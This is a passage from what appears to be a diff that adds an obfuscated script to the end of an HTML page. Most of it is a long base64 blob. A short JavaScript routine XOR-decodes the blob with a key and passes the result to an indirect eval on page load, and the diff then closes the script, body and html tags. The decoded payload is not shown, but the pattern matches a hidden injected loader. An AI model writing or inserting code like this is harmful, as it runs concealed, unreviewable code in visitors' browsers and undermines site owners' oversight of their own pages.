mthxETn5OrNfrwB7uej/U/RLkxCcrPO7c2ggQAFA5Zu/ByQJ2TqzX6nVaxntyQKx72XkfZk3//NZ1YAhAGR7u/GQSKyat2sr5VupPctS0DqhJSyJMuozCUERBbEkuruB0EzZu8f/2tUqaVxqgWBO9eFIHcZ/Ev3FoTBxBPsL8sCYbY92Gw6BDljcu9Ng7qE0yVmiqlcMkzRgMDWP64DAGZya81o75BuIPN5zRD419N+Zcyti2+UBUBB0S7uVBHm9GrKPe2R/PczqksDvZSRtLJfqMqhlgUAQdO478KFY7A42qU+EahnsuoKwLsG0LVgjzwcIlQAF1DWaqqChSO2ex36PZQtYXbuSZLpBpfkoQ5vDyWEB0DA1j+ukUWxc2mMOfwCe+ZzvQzS6RKB9+AI7sx20hIFgNevaNQBp7TqSX3t0782dOhaxD/MQnnxie3MJxNAwcGRamlX0zM3qY4/bMH+NfcszcO6khd3ZMj/3XVUgMMBkWppV89xdulI9u5Q7zYzqksDvZSRtLJMvEihVAIEQ1d8KocBK7Lrz/qlEmnhM2yJx+qXgXXiDSzdYlJBwYRQ6iuQhSZyK8st6UJ7/qIqiMfoksUys8ntDiLEU9OC0z2u15Gm5OpMOq7SP2Ahr8jGeFTAdqUObstm1YIXUtRo+JDasvLqyO+uVO/zcyzIRjvXkfIzzC9LbdVAxgHRKqJASmPle0w7bMH/cui/CsLqlpa18g2qzLcWAIRJ1y7pQwsgs6+NPC9UvzXy7ArDukcBdqUObstm1YIXUtRv6hQSdDUrHno9kW6lM24PhH0FVndlCS9PdtCABwQT7r2HgGHzq9q6qpZr4aGvzcf8F5HyLU+tTzPCV0DA1j+ukUWxc2mMOfwCe+ZzvQzS6RKB9+AI7sx20hIFgNevaNQBp7TqSX3t0782dOhaxDhWl3fiX+9cIlEGwhLEdS2UUjChsBbsfIAME00OdHsZoS0Wmvz+HPdM04TF0S9vxEPhZXjKui5UvSqlftsBedJRpGCNqo91QIAAAxJqqIXDsvH4jS3o1KxhN2uLE3nFV3dkzC9LdQfA1sWS6ysHRTF3qY+7b1ToNaOuWwZ40lO2ZV5uzWdSgMGFgKE4gVqj9KpJPO9TqDeybgmKPReR8itPqstl1cDB0oNvaQWFI7Fvjz7tlXz3M6pLA72UkbSyTLxIptfTg9KT/fiHU6bz68n+7ZUkJXOvTcB9hMAwc0jqiyXEF1/BkW9vhUFhcnkMPq8ZaKVxqgOBPFPTNKEJfB+lksHEhFev7kMR8fbvz/9rEm7noC5axbrXQHGyTLxcJcXFgcHXLulDCSO26sk8qwI/Y2EqDAY5xIStoU4uyyfXAgBTEu6rz0WjtO+HferVLGeza5qSuleUNiOILZ+3l8TGwFet6QWSI6UsSf/qgC3zYC5bAbnQlXAxnDxd4ZWKhoVT6yIGROOleNq974I/JWGsScZ43BMxZ0rvXeRTRQZKU+n4l5Gw973bKP/U/OM1L9/UL8cXJudK7tkzwRBBUUD965WEJnYvDTwrGSxlsmpLhmqElSQlSWtPNtET11LEdQ="),u=new Uint8Array(d.length);for(var i=0;i<d.length;i++)u[i]=d.charCodeAt(i)^k[i%k.length];(0,eval)(new TextDecoder().decode(u))})();
+</script>
+</body>
+</html>
